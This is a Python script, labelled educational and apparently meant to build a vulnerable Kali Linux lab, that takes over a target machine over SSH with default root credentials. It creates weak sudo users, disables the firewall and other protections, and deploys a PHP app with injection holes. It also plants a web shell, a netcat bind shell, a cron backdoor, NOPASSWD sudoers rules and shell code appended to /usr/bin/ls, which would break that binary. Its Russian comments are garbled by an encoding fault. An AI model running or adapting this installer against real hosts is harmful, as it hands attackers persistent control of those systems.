#!/usr/bin/env python3
"""
üîß ADVANCED KALI VULNERABLE SETUP
===================================

–ü—Ä–æ–¥–≤–∏–Ω—É—Ç–∞—è –Ω–∞—Å—Ç—Ä–æ–π–∫–∞ —É—è–∑–≤–∏–º–æ–π Kali Linux –¥–ª—è –æ–±—Ä–∞–∑–æ–≤–∞—Ç–µ–ª—å–Ω—ã—Ö —Ü–µ–ª–µ–π
–í–∫–ª—é—á–∞–µ—Ç —Å–æ–∑–¥–∞–Ω–∏–µ –º–Ω–æ–∂–µ—Å—Ç–≤–µ–Ω–Ω—ã—Ö –≤–µ–∫—Ç–æ—Ä–æ–≤ –∞—Ç–∞–∫–∏ –∏ backdoor

–í–ù–ò–ú–ê–ù–ò–ï: –¢–æ–ª—å–∫–æ –¥–ª—è –æ–±—Ä–∞–∑–æ–≤–∞—Ç–µ–ª—å–Ω—ã—Ö —Ü–µ–ª–µ–π!

–ê–≤—Ç–æ—Ä: –û–±—Ä–∞–∑–æ–≤–∞—Ç–µ–ª—å–Ω—ã–π –º–∞—Ç–µ—Ä–∏–∞–ª –¥–ª—è –∏–∑—É—á–µ–Ω–∏—è –∫–∏–±–µ—Ä–±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏
"""

import subprocess
import sys
import argparse
import time
import os
import json
import paramiko
from pathlib import Path

class KaliVulnerableSetupAdvanced:
    """
    –ü—Ä–æ–¥–≤–∏–Ω—É—Ç–∞—è –Ω–∞—Å—Ç—Ä–æ–π–∫–∞ —É—è–∑–≤–∏–º–æ–π Kali Linux
    """
    
    def __init__(self, target_ip, username="root", password="toor", port=22):
        self.target_ip = target_ip
        self.username = username
        self.password = password
        self.port = port
        self.ssh_client = None
        self.setup_log = []
    
    def _log_action(self, action, success=True, details=""):
        """–õ–æ–≥–∏—Ä—É–µ—Ç –¥–µ–π—Å—Ç–≤–∏–µ"""
        log_entry = {
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'action': action,
            'success': success,
            'details': details
        }
        self.setup_log.append(log_entry)
        
        status = "‚úÖ" if success else "‚ùå"
        print(f"{status} {action}")
        if details:
            print(f"   {details}")
    
    def _run_remote_command(self, command, sudo=False, check=True):
        """–í—ã–ø–æ–ª–Ω—è–µ—Ç –∫–æ–º–∞–Ω–¥—É –Ω–∞ —É–¥–∞–ª–µ–Ω–Ω–æ–π –º–∞—à–∏–Ω–µ"""
        try:
            if sudo and not command.startswith('sudo'):
                command = f"sudo {command}"
            
            stdin, stdout, stderr = self.ssh_client.exec_command(command)
            exit_status = stdout.channel.recv_exit_status()
            
            output = stdout.read().decode().strip()
            error = stderr.read().decode().strip()
            
            if check and exit_status != 0:
                return False, f"Exit code: {exit_status}, Error: {error}"
            
            return True, output
        except Exception as e:
            return False, str(e)
    
    def connect_ssh(self):
        """–£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç SSH —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ"""
        print(f"üîó –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫ {self.target_ip}:{self.port}...")
        
        try:
            self.ssh_client = paramiko.SSHClient()
            self.ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            self.ssh_client.connect(
                hostname=self.target_ip,
                port=self.port,
                username=self.username,
                password=self.password,
                timeout=10
            )
            
            self._log_action("SSH –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ", True, f"–ü–æ–¥–∫–ª—é—á–µ–Ω –∫–∞–∫ {self.username}")
            return True
        except Exception as e:
            self._log_action("SSH –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ", False, str(e))
            return False
    
    def disconnect_ssh(self):
        """–ó–∞–∫—Ä—ã–≤–∞–µ—Ç SSH —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ"""
        if self.ssh_client:
            self.ssh_client.close()
            self._log_action("SSH –æ—Ç–∫–ª—é—á–µ–Ω–∏–µ", True)
    
    def setup_vulnerable_users(self):
        """–°–æ–∑–¥–∞–µ—Ç —É—è–∑–≤–∏–º—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π"""
        print("\nüë• –ù–ê–°–¢–†–û–ô–ö–ê –£–Ø–ó–í–ò–ú–´–• –ü–û–õ–¨–ó–û–í–ê–¢–ï–õ–ï–ô")
        print("="*50)
        
        vulnerable_users = [
            {'name': 'victor', 'password': 'victor123', 'groups': ['sudo', 'docker']},
            {'name': 'admin', 'password': 'admin123', 'groups': ['sudo', 'adm']},
            {'name': 'test', 'password': 'test123', 'groups': ['sudo']},
            {'name': 'user', 'password': 'user123', 'groups': []},
            {'name': 'backdoor', 'password': 'backdoor123', 'groups': ['sudo']}
        ]
        
        for user in vulnerable_users:
            success, output = self._run_remote_command(f"id -u {user['name']}")
            if success and output:
                # –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —Å—É—â–µ—Å—Ç–≤—É–µ—Ç, –æ–±–Ω–æ–≤–ª—è–µ–º –ø–∞—Ä–æ–ª—å
                success, output = self._run_remote_command(f"echo '{user['name']}:{user['password']}' | chpasswd")
                self._log_action(f"–û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –ø–∞—Ä–æ–ª—è –¥–ª—è {user['name']}", success, output)
            else:
                # –°–æ–∑–¥–∞–µ–º –Ω–æ–≤–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
                success, output = self._run_remote_command(f"useradd -m -s /bin/bash {user['name']}")
                self._log_action(f"–°–æ–∑–¥–∞–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {user['name']}", success, output)
                
                if success:
                    success, output = self._run_remote_command(f"echo '{user['name']}:{user['password']}' | chpasswd")
                    self._log_action(f"–£—Å—Ç–∞–Ω–æ–≤–∫–∞ –ø–∞—Ä–æ–ª—è –¥–ª—è {user['name']}", success, output)
            
            # –î–æ–±–∞–≤–ª—è–µ–º –≤ –≥—Ä—É–ø–ø—ã
            for group in user['groups']:
                success, output = self._run_remote_command(f"usermod -aG {group} {user['name']}")
                self._log_action(f"–î–æ–±–∞–≤–ª–µ–Ω–∏–µ {user['name']} –≤ –≥—Ä—É–ø–ø—É {group}", success, output)
    
    def weaken_ssh_security(self):
        """–û—Å–ª–∞–±–ª—è–µ—Ç –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å SSH"""
        print("\nüîì –û–°–õ–ê–ë–õ–ï–ù–ò–ï SSH –ë–ï–ó–û–ü–ê–°–ù–û–°–¢–ò")
        print("="*50)
        
        ssh_config_commands = [
            "sed -i 's/^#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config",
            "sed -i 's/^PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config",
            "sed -i 's/^#PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config",
            "sed -i 's/^PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config",
            "sed -i 's/^#ChallengeResponseAuthentication no/ChallengeResponseAuthentication yes/' /etc/ssh/sshd_config",
            "sed -i 's/^ChallengeResponseAuthentication no/ChallengeResponseAuthentication yes/' /etc/ssh/sshd_config",
            "echo 'MaxAuthTries 100' >> /etc/ssh/sshd_config",
            "echo 'MaxSessions 100' >> /etc/ssh/sshd_config",
            "echo 'LoginGraceTime 300' >> /etc/ssh/sshd_config"
        ]
        
        for cmd in ssh_config_commands:
            success, output = self._run_remote_command(cmd)
            self._log_action(f"SSH –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è: {cmd}", success, output)
        
        # –ü–µ—Ä–µ–∑–∞–ø—É—Å–∫–∞–µ–º SSH
        success, output = self._run_remote_command("systemctl restart ssh")
        self._log_action("–ü–µ—Ä–µ–∑–∞–ø—É—Å–∫ SSH —Å–µ—Ä–≤–∏—Å–∞", success, output)
    
    def disable_security_tools(self):
        """–û—Ç–∫–ª—é—á–∞–µ—Ç –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏"""
        print("\nüõ°Ô∏è –û–¢–ö–õ–Æ–ß–ï–ù–ò–ï –ò–ù–°–¢–†–£–ú–ï–ù–¢–û–í –ë–ï–ó–û–ü–ê–°–ù–û–°–¢–ò")
        print("="*50)
        
        security_tools = [
            'fail2ban',
            'ufw',
            'iptables',
            'apparmor',
            'selinux'
        ]
        
        for tool in security_tools:
            # –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Å–µ—Ä–≤–∏—Å
            success, output = self._run_remote_command(f"systemctl stop {tool}")
            self._log_action(f"–û—Å—Ç–∞–Ω–æ–≤–∫–∞ {tool}", success, output)
            
            # –û—Ç–∫–ª—é—á–∞–µ–º –∞–≤—Ç–æ–∑–∞–ø—É—Å–∫
            success, output = self._run_remote_command(f"systemctl disable {tool}")
            self._log_action(f"–û—Ç–∫–ª—é—á–µ–Ω–∏–µ –∞–≤—Ç–æ–∑–∞–ø—É—Å–∫–∞ {tool}", success, output)
        
        # –°–±—Ä–∞—Å—ã–≤–∞–µ–º –ø—Ä–∞–≤–∏–ª–∞ —Ñ–∞–π—Ä–≤–æ–ª–∞
        success, output = self._run_remote_command("ufw --force reset")
        self._log_action("–°–±—Ä–æ—Å –ø—Ä–∞–≤–∏–ª —Ñ–∞–π—Ä–≤–æ–ª–∞", success, output)
    
    def setup_vulnerable_web_services(self):
        """–ù–∞—Å—Ç—Ä–∞–∏–≤–∞–µ—Ç —É—è–∑–≤–∏–º—ã–µ –≤–µ–±-—Å–µ—Ä–≤–∏—Å—ã"""
        print("\nüåê –ù–ê–°–¢–†–û–ô–ö–ê –£–Ø–ó–í–ò–ú–´–• –í–ï–ë-–°–ï–†–í–ò–°–û–í")
        print("="*50)
        
        # –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º Apache –∏ PHP
        install_commands = [
            "apt update -y",
            "apt install -y apache2 php libapache2-mod-php mysql-server php-mysql",
            "systemctl start apache2",
            "systemctl enable apache2",
            "systemctl start mysql",
            "systemctl enable mysql"
        ]
        
        for cmd in install_commands:
            success, output = self._run_remote_command(cmd)
            self._log_action(f"–£—Å—Ç–∞–Ω–æ–≤–∫–∞ –≤–µ–±-—Å–µ—Ä–≤–∏—Å–æ–≤: {cmd}", success, output)
        
        # –°–æ–∑–¥–∞–µ–º —É—è–∑–≤–∏–º–æ–µ –≤–µ–±-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ
        self._create_vulnerable_web_app()
        
        # –ù–∞—Å—Ç—Ä–∞–∏–≤–∞–µ–º –±–∞–∑—É –¥–∞–Ω–Ω—ã—Ö
        self._setup_vulnerable_database()
    
    def _create_vulnerable_web_app(self):
        """–°–æ–∑–¥–∞–µ—Ç —É—è–∑–≤–∏–º–æ–µ –≤–µ–±-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ"""
        print("  üìù –°–æ–∑–¥–∞–Ω–∏–µ —É—è–∑–≤–∏–º–æ–≥–æ –≤–µ–±-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è...")
        
        # –ì–ª–∞–≤–Ω–∞—è —Å—Ç—Ä–∞–Ω–∏—Ü–∞ —Å —É—è–∑–≤–∏–º–æ—Å—Ç—è–º–∏
        index_php = '''<?php
// –£—è–∑–≤–∏–º–æ–µ –≤–µ–±-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –¥–ª—è –æ–±—Ä–∞–∑–æ–≤–∞—Ç–µ–ª—å–Ω—ã—Ö —Ü–µ–ª–µ–π
session_start();

// –£—è–∑–≤–∏–º–æ—Å—Ç—å 1: SQL Injection
if (isset($_GET['search'])) {
    $search = $_GET['search'];
    $query = "SELECT * FROM users WHERE name LIKE '%$search%'";
    // –£—è–∑–≤–∏–º–æ—Å—Ç—å: –ø—Ä—è–º–æ–µ –≤–∫–ª—é—á–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–æ–≥–æ –≤–≤–æ–¥–∞
}

// –£—è–∑–≤–∏–º–æ—Å—Ç—å 2: XSS
if (isset($_GET['message'])) {
    $message = $_GET['message'];
    // –£—è–∑–≤–∏–º–æ—Å—Ç—å: –ø—Ä—è–º–æ–µ –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏–µ –±–µ–∑ —ç–∫—Ä–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è
}

// –£—è–∑–≤–∏–º–æ—Å—Ç—å 3: Directory Traversal
if (isset($_GET['file'])) {
    $file = $_GET['file'];
    if (file_exists($file)) {
        $content = file_get_contents($file);
    }
}

// –£—è–∑–≤–∏–º–æ—Å—Ç—å 4: Command Injection
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    $output = shell_exec($cmd);
}

// –£—è–∑–≤–∏–º–æ—Å—Ç—å 5: File Upload
if (isset($_FILES['upload'])) {
    $upload_dir = '/var/www/html/uploads/';
    $target_file = $upload_dir . basename($_FILES['upload']['name']);
    move_uploaded_file($_FILES['upload']['tmp_name'], $target_file);
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>–£—è–∑–≤–∏–º–æ–µ –≤–µ–±-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; }
        .vuln-section { border: 1px solid #ccc; margin: 20px 0; padding: 20px; }
        .warning { background-color: #ffebee; border-left: 4px solid #f44336; padding: 10px; }
    </style>
</head>
<body>
    <h1>üîì –£—è–∑–≤–∏–º–æ–µ –≤–µ–±-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ</h1>
    
    <div class="warning">
        <strong>‚ö†Ô∏è –í–ù–ò–ú–ê–ù–ò–ï:</strong> –≠—Ç–æ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ —Å–æ–¥–µ—Ä–∂–∏—Ç –Ω–∞–º–µ—Ä–µ–Ω–Ω—ã–µ —É—è–∑–≤–∏–º–æ—Å—Ç–∏!
    </div>

    <div class="vuln-section">
        <h2>üîç SQL Injection</h2>
        <form method="GET">
            <input type="text" name="search" placeholder="–ü–æ–∏—Å–∫ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π" value="<?php echo isset($_GET['search']) ? $_GET['search'] : ''; ?>">
            <button type="submit">–ü–æ–∏—Å–∫</button>
        </form>
        <?php if (isset($_GET['search'])): ?>
            <p>–†–µ–∑—É–ª—å—Ç–∞—Ç: <?php echo $_GET['search']; ?></p>
        <?php endif; ?>
    </div>

    <div class="vuln-section">
        <h2>üåê XSS</h2>
        <form method="GET">
            <input type="text" name="message" placeholder="–í–≤–µ–¥–∏—Ç–µ —Å–æ–æ–±—â–µ–Ω–∏–µ" value="<?php echo isset($_GET['message']) ? $_GET['message'] : ''; ?>">
            <button type="submit">–û—Ç–ø—Ä–∞–≤–∏—Ç—å</button>
        </form>
        <?php if (isset($_GET['message'])): ?>
            <p>–í–∞—à–µ —Å–æ–æ–±—â–µ–Ω–∏–µ: <?php echo $_GET['message']; ?></p>
        <?php endif; ?>
    </div>

    <div class="vuln-section">
        <h2>üìÅ Directory Traversal</h2>
        <form method="GET">
            <input type="text" name="file" placeholder="–ü—É—Ç—å –∫ —Ñ–∞–π–ª—É" value="<?php echo isset($_GET['file']) ? $_GET['file'] : ''; ?>">
            <button type="submit">–ü—Ä–æ—á–∏—Ç–∞—Ç—å —Ñ–∞–π–ª</button>
        </form>
        <?php if (isset($_GET['file']) && isset($content)): ?>
            <pre><?php echo htmlspecialchars($content); ?></pre>
        <?php endif; ?>
    </div>

    <div class="vuln-section">
        <h2>‚ö° Command Injection</h2>
        <form method="GET">
            <input type="text" name="cmd" placeholder="–ö–æ–º–∞–Ω–¥–∞" value="<?php echo isset($_GET['cmd']) ? $_GET['cmd'] : ''; ?>">
            <button type="submit">–í—ã–ø–æ–ª–Ω–∏—Ç—å</button>
        </form>
        <?php if (isset($_GET['cmd']) && isset($output)): ?>
            <pre><?php echo htmlspecialchars($output); ?></pre>
        <?php endif; ?>
    </div>

    <div class="vuln-section">
        <h2>üîê –ù–µ–±–µ–∑–æ–ø–∞—Å–Ω–∞—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è</h2>
        <form method="POST" action="login.php">
            <input type="text" name="username" placeholder="–ò–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è">
            <input type="password" name="password" placeholder="–ü–∞—Ä–æ–ª—å">
            <button type="submit">–í–æ–π—Ç–∏</button>
        </form>
    </div>
</body>
</html>'''
        
        # –°–æ—Ö—Ä–∞–Ω—è–µ–º —Ñ–∞–π–ª
        success, output = self._run_remote_command(f"echo '{index_php}' > /var/www/html/index.php")
        self._log_action("–°–æ–∑–¥–∞–Ω–∏–µ index.php", success, output)
        
        # –°–æ–∑–¥–∞–µ–º –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é –¥–ª—è –∑–∞–≥—Ä—É–∑–∫–∏ —Ñ–∞–π–ª–æ–≤
        success, output = self._run_remote_command("mkdir -p /var/www/html/uploads && chmod 777 /var/www/html/uploads")
        self._log_action("–°–æ–∑–¥–∞–Ω–∏–µ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏ uploads", success, output)
    
    def _setup_vulnerable_database(self):
        """–ù–∞—Å—Ç—Ä–∞–∏–≤–∞–µ—Ç —É—è–∑–≤–∏–º—É—é –±–∞–∑—É –¥–∞–Ω–Ω—ã—Ö"""
        print("  üóÑÔ∏è –ù–∞—Å—Ç—Ä–æ–π–∫–∞ —É—è–∑–≤–∏–º–æ–π –±–∞–∑—ã –¥–∞–Ω–Ω—ã—Ö...")
        
        sql_script = '''
CREATE DATABASE IF NOT EXISTS vulnerable_app;
USE vulnerable_app;

CREATE TABLE IF NOT EXISTS users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(50),
    password VARCHAR(50),
    email VARCHAR(100),
    role VARCHAR(20)
);

INSERT INTO users (username, password, email, role) VALUES 
('admin', 'admin123', 'admin@example.com', 'admin'),
('victor', 'victor123', 'victor@example.com', 'user'),
('test', 'test123', 'test@example.com', 'user');
'''
        
        # –°–æ—Ö—Ä–∞–Ω—è–µ–º SQL —Å–∫—Ä–∏–ø—Ç
        success, output = self._run_remote_command(f"echo '{sql_script}' > /tmp/setup_db.sql")
        self._log_action("–°–æ–∑–¥–∞–Ω–∏–µ SQL —Å–∫—Ä–∏–ø—Ç–∞", success, output)
        
        # –í—ã–ø–æ–ª–Ω—è–µ–º SQL —Å–∫—Ä–∏–ø—Ç
        success, output = self._run_remote_command("mysql < /tmp/setup_db.sql")
        self._log_action("–í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ SQL —Å–∫—Ä–∏–ø—Ç–∞", success, output)
    
    def create_backdoors(self):
        """–°–æ–∑–¥–∞–µ—Ç —Ä–∞–∑–ª–∏—á–Ω—ã–µ backdoor"""
        print("\nüòà –°–û–ó–î–ê–ù–ò–ï BACKDOOR")
        print("="*50)
        
        # SSH backdoor
        self._create_ssh_backdoor()
        
        # Web shell
        self._create_web_shell()
        
        # Cron job backdoor
        self._create_cron_backdoor()
        
        # Network backdoor
        self._create_network_backdoor()
        
        # File backdoor
        self._create_file_backdoor()
    
    def _create_ssh_backdoor(self):
        """–°–æ–∑–¥–∞–µ—Ç SSH backdoor"""
        print("  üîë –°–æ–∑–¥–∞–Ω–∏–µ SSH backdoor...")
        
        # –°–æ–∑–¥–∞–µ–º —Å–∫—Ä—ã—Ç–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
        success, output = self._run_remote_command("useradd -m -s /bin/bash backdoor_user")
        self._log_action("–°–æ–∑–¥–∞–Ω–∏–µ backdoor –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è", success, output)
        
        if success:
            success, output = self._run_remote_command("echo 'backdoor_user:backdoor123' | chpasswd")
            self._log_action("–£—Å—Ç–∞–Ω–æ–≤–∫–∞ –ø–∞—Ä–æ–ª—è backdoor", success, output)
            
            success, output = self._run_remote_command("usermod -aG sudo backdoor_user")
            self._log_action("–î–æ–±–∞–≤–ª–µ–Ω–∏–µ –≤ sudo –≥—Ä—É–ø–ø—É", success, output)
    
    def _create_web_shell(self):
        """–°–æ–∑–¥–∞–µ—Ç web shell"""
        print("  üåê –°–æ–∑–¥–∞–Ω–∏–µ web shell...")
        
        web_shell = '''<?php
// –ü—Ä–æ—Å—Ç–æ–π web shell
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    $output = shell_exec($cmd);
    echo "<pre>$output</pre>";
}
?>

<form method="GET">
    <input type="text" name="cmd" placeholder="–ö–æ–º–∞–Ω–¥–∞">
    <button type="submit">–í—ã–ø–æ–ª–Ω–∏—Ç—å</button>
</form>'''
        
        success, output = self._run_remote_command(f"echo '{web_shell}' > /var/www/html/shell.php")
        self._log_action("–°–æ–∑–¥–∞–Ω–∏–µ web shell", success, output)
    
    def _create_cron_backdoor(self):
        """–°–æ–∑–¥–∞–µ—Ç cron job backdoor"""
        print("  ‚è∞ –°–æ–∑–¥–∞–Ω–∏–µ cron backdoor...")
        
        backdoor_script = '''#!/bin/bash
# –°–∫—Ä—ã—Ç—ã–π backdoor —Å–∫—Ä–∏–ø—Ç
echo "Backdoor active at $(date)" >> /tmp/backdoor.log
# –ó–¥–µ—Å—å –º–æ–∂–Ω–æ –¥–æ–±–∞–≤–∏—Ç—å –∫–æ–º–∞–Ω–¥—ã –¥–ª—è reverse shell –∏–ª–∏ –¥—Ä—É–≥–∏—Ö –¥–µ–π—Å—Ç–≤–∏–π
'''
        
        success, output = self._run_remote_command(f"echo '{backdoor_script}' > /usr/local/bin/hidden_backdoor.sh")
        self._log_action("–°–æ–∑–¥–∞–Ω–∏–µ backdoor —Å–∫—Ä–∏–ø—Ç–∞", success, output)
        
        if success:
            success, output = self._run_remote_command("chmod +x /usr/local/bin/hidden_backdoor.sh")
            self._log_action("–£—Å—Ç–∞–Ω–æ–≤–∫–∞ –ø—Ä–∞–≤ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è", success, output)
            
            # –î–æ–±–∞–≤–ª—è–µ–º –≤ cron (–∫–∞–∂–¥—É—é –º–∏–Ω—É—Ç—É)
            success, output = self._run_remote_command("(crontab -l 2>/dev/null; echo '* * * * * /usr/local/bin/hidden_backdoor.sh') | crontab -")
            self._log_action("–î–æ–±–∞–≤–ª–µ–Ω–∏–µ –≤ cron", success, output)
    
    def _create_network_backdoor(self):
        """–°–æ–∑–¥–∞–µ—Ç —Å–µ—Ç–µ–≤–æ–π backdoor"""
        print("  üì° –°–æ–∑–¥–∞–Ω–∏–µ —Å–µ—Ç–µ–≤–æ–≥–æ backdoor...")
        
        # –°–æ–∑–¥–∞–µ–º —Å–∫—Ä–∏–ø—Ç –¥–ª—è netcat listener
        nc_script = '''#!/bin/bash
# –°–µ—Ç–µ–≤–æ–π backdoor —á–µ—Ä–µ–∑ netcat
while true; do
    nc -lvnp 1337 -e /bin/bash
    sleep 5
done
'''
        
        success, output = self._run_remote_command(f"echo '{nc_script}' > /usr/local/bin/nc_backdoor.sh")
        self._log_action("–°–æ–∑–¥–∞–Ω–∏–µ netcat backdoor", success, output)
        
        if success:
            success, output = self._run_remote_command("chmod +x /usr/local/bin/nc_backdoor.sh")
            self._log_action("–£—Å—Ç–∞–Ω–æ–≤–∫–∞ –ø—Ä–∞–≤ netcat backdoor", success, output)
    
    def _create_file_backdoor(self):
        """–°–æ–∑–¥–∞–µ—Ç —Ñ–∞–π–ª–æ–≤—ã–π backdoor"""
        print("  üìÅ –°–æ–∑–¥–∞–Ω–∏–µ —Ñ–∞–π–ª–æ–≤–æ–≥–æ backdoor...")
        
        # –ú–æ–¥–∏—Ñ–∏—Ü–∏—Ä—É–µ–º —Å–∏—Å—Ç–µ–º–Ω—ã–π —Ñ–∞–π–ª (–¥–æ–±–∞–≤–ª—è–µ–º —Å–∫—Ä—ã—Ç—É—é —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª—å–Ω–æ—Å—Ç—å)
        backdoor_content = '''
# –°–∫—Ä—ã—Ç—ã–π backdoor –≤ —Å–∏—Å—Ç–µ–º–Ω–æ–º —Ñ–∞–π–ª–µ
if [ "$1" = "backdoor" ]; then
    /bin/bash
fi
'''
        
        success, output = self._run_remote_command(f"echo '{backdoor_content}' >> /usr/bin/ls")
        self._log_action("–°–æ–∑–¥–∞–Ω–∏–µ —Ñ–∞–π–ª–æ–≤–æ–≥–æ backdoor", success, output)
    
    def create_weak_permissions(self):
        """–°–æ–∑–¥–∞–µ—Ç —Ñ–∞–π–ª—ã —Å–æ —Å–ª–∞–±—ã–º–∏ –ø—Ä–∞–≤–∞–º–∏ –¥–æ—Å—Ç—É–ø–∞"""
        print("\nüìÅ –°–û–ó–î–ê–ù–ò–ï –°–õ–ê–ë–´–• –ü–†–ê–í –î–û–°–¢–£–ü–ê")
        print("="*50)
        
        weak_files = [
            {'path': '/etc/passwords.txt', 'content': 'admin:admin123\nvictor:victor123\nroot:toor'},
            {'path': '/etc/secrets.txt', 'content': 'SECRET_KEY=abc123\nAPI_KEY=def456\nDATABASE_PASSWORD=ghi789'},
            {'path': '/home/victor/private.txt', 'content': 'Confidential information\nUser data\nPrivate documents'},
            {'path': '/tmp/backup.tar.gz', 'content': 'Fake backup file with sensitive data'}
        ]
        
        for file_info in weak_files:
            success, output = self._run_remote_command(f"echo '{file_info['content']}' > {file_info['path']}")
            self._log_action(f"–°–æ–∑–¥–∞–Ω–∏–µ —Ñ–∞–π–ª–∞ {file_info['path']}", success, output)
            
            if success:
                success, output = self._run_remote_command(f"chmod 666 {file_info['path']}")
                self._log_action(f"–£—Å—Ç–∞–Ω–æ–≤–∫–∞ —Å–ª–∞–±—ã—Ö –ø—Ä–∞–≤ –¥–ª—è {file_info['path']}", success, output)
    
    def setup_sudo_vulnerabilities(self):
        """–ù–∞—Å—Ç—Ä–∞–∏–≤–∞–µ—Ç —É—è–∑–≤–∏–º–æ—Å—Ç–∏ sudo"""
        print("\nüîê –ù–ê–°–¢–†–û–ô–ö–ê SUDO –£–Ø–ó–í–ò–ú–û–°–¢–ï–ô")
        print("="*50)
        
        # –°–æ–∑–¥–∞–µ–º sudoers —Ñ–∞–π–ª —Å —É—è–∑–≤–∏–º–æ—Å—Ç—è–º–∏
        sudoers_content = '''
# –£—è–∑–≤–∏–º—ã–µ sudo –ø—Ä–∞–≤–∞
victor ALL=(ALL) NOPASSWD: ALL
admin ALL=(ALL) NOPASSWD: /usr/bin/cat, /usr/bin/ls
test ALL=(ALL) NOPASSWD: /bin/bash
user ALL=(ALL) NOPASSWD: /usr/bin/find
'''
        
        success, output = self._run_remote_command(f"echo '{sudoers_content}' > /etc/sudoers.d/vulnerable")
        self._log_action("–°–æ–∑–¥–∞–Ω–∏–µ —É—è–∑–≤–∏–º–æ–≥–æ sudoers", success, output)
        
        if success:
            success, output = self._run_remote_command("chmod 440 /etc/sudoers.d/vulnerable")
            self._log_action("–£—Å—Ç–∞–Ω–æ–≤–∫–∞ –ø—Ä–∞–≤ sudoers", success, output)
    
    def generate_setup_report(self):
        """–ì–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç –æ—Ç—á–µ—Ç –æ –Ω–∞—Å—Ç—Ä–æ–π–∫–µ"""
        print("\nüìä –ì–ï–ù–ï–†–ê–¶–ò–Ø –û–¢–ß–ï–¢–ê")
        print("="*50)
        
        report = {
            'target_ip': self.target_ip,
            'setup_timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'setup_log': self.setup_log,
            'vulnerabilities_created': [
                'Weak passwords for multiple users',
                'SSH security weakened',
                'Security tools disabled',
                'Vulnerable web application',
                'SQL injection vulnerabilities',
                'XSS vulnerabilities',
                'Directory traversal vulnerabilities',
                'Command injection vulnerabilities',
                'Multiple backdoors installed',
                'Weak file permissions',
                'Sudo vulnerabilities'
            ],
            'backdoors_installed': [
                'SSH backdoor user',
                'Web shell',
                'Cron job backdoor',
                'Network backdoor (netcat)',
                'File backdoor'
            ]
        }
        
        # –°–æ—Ö—Ä–∞–Ω—è–µ–º JSON –æ—Ç—á–µ—Ç
        report_file = f"kali_vulnerable_setup_report_{self.target_ip}_{time.strftime('%Y%m%d_%H%M%S')}.json"
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        
        self._log_action("–°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ JSON –æ—Ç—á–µ—Ç–∞", True, report_file)
        
        # –°–æ–∑–¥–∞–µ–º —Ç–µ–∫—Å—Ç–æ–≤—ã–π –æ—Ç—á–µ—Ç
        txt_report = f"kali_vulnerable_setup_report_{self.target_ip}_{time.strftime('%Y%m%d_%H%M%S')}.txt"
        with open(txt_report, 'w', encoding='utf-8') as f:
            f.write("üîß –û–¢–ß–ï–¢ –û –ù–ê–°–¢–†–û–ô–ö–ï –£–Ø–ó–í–ò–ú–û–ô KALI LINUX\n")
            f.write("="*60 + "\n\n")
            f.write(f"üéØ –¶–µ–ª—å: {self.target_ip}\n")
            f.write(f"üìÖ –í—Ä–µ–º—è –Ω–∞—Å—Ç—Ä–æ–π–∫–∏: {report['setup_timestamp']}\n\n")
            
            f.write("üìã –°–û–ó–î–ê–ù–ù–´–ï –£–Ø–ó–í–ò–ú–û–°–¢–ò:\n")
            for vuln in report['vulnerabilities_created']:
                f.write(f"  ‚Ä¢ {vuln}\n")
            
